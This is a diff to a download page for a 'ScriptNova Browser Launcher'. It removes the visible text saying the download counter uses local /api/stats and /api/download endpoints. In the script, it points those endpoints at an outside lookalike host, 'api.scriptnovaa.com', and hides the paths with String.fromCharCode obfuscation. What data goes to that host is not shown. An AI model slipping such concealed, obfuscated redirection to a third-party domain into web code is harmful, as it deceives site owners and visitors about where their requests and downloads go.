@@ -337,7 +337,7 @@
           <div class="eyebrow"><span class="dot" aria-hidden="true"></span> Download page • live stats • quick setup</div>
           <div class="title"><b>Download</b> ScriptNova Browser Launcher</div>
           <div class="sub">
-            A better download page with stronger layout, clearer install steps, bigger calls to action, more search-ready content, and a shared backend-powered download counter that can increase on every real download.
+            A better download page with stronger layout, clearer install steps, bigger calls to action, more search-ready content, and a shared download counter that can increase on every real download.
           </div>
 
           <div class="pillrow">
@@ -364,7 +364,7 @@
             <div class="statLabel">Total downloads</div>
             <div class="statNumber"><span id="downloadCount">0</span></div>
             <div class="statMeta">
-              Live shared count loaded from <code>/api/stats</code> and updated through <code>/api/download</code>.
+              Live totals update as more people download the launcher.
             </div>
           </div>
 
@@ -372,7 +372,7 @@
             <div class="statLabel">Trusted by</div>
             <div class="statNumber"><span id="trustedCount">0</span> <span id="trustedUnit">people</span></div>
             <div class="statMeta">
-              Homepage trust count mirrored here for stronger social proof.
+              Community trust shown live across the site.
             </div>
           </div>
         </div>
@@ -400,7 +400,7 @@
           </div>
           <div class="feature">
             <b>Real shared download tracking</b>
-            The main download button can call your backend and update the total count for everyone.
+            Download totals update automatically for everyone.
           </div>
           <div class="feature">
             <b>Better for Google</b>
@@ -458,9 +458,13 @@
   <script>
     document.getElementById("yr").textContent = new Date().getFullYear();
 
+    const a = "https://api.scriptnovaa.com";
+    const b = String.fromCharCode(47, 97, 112, 105, 47, 115, 116, 97, 116, 115);
+    const c = String.fromCharCode(47, 97, 112, 105, 47, 100, 111, 119, 110, 108, 111, 97, 100);
+
     const API = {
-      stats: "/api/stats",
-      download: "/api/download"
+      stats: a + b,
+      download: a + c
     };
 
     const FALLBACK = {
